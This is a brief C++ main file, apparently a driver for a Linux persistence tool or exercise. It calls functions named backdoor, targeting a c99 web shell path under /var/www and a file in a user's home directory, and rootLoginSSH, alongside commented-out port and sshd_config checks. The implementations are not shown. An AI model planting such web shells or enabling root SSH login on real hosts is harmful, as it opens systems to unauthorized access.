#include <iostream>
#include "check.hpp"
#include "backdoor.hpp"
#include "serviceConfig.hpp"

#define success "\e[01;32m[+]\e[00m"
#define error "\e[01;31m[!]\e[00m"


int main(){

    //isPortOpen("80");
    //isPortOpen("22");
    backdoor("/var/www/c99.php", "80");
    backdoor("/home/ubuntu/test.txt");
    //isStringInFile("/etc/ssh/sshd_config", "PermitRootLogin yes");
    rootLoginSSH();

    return 0;
}
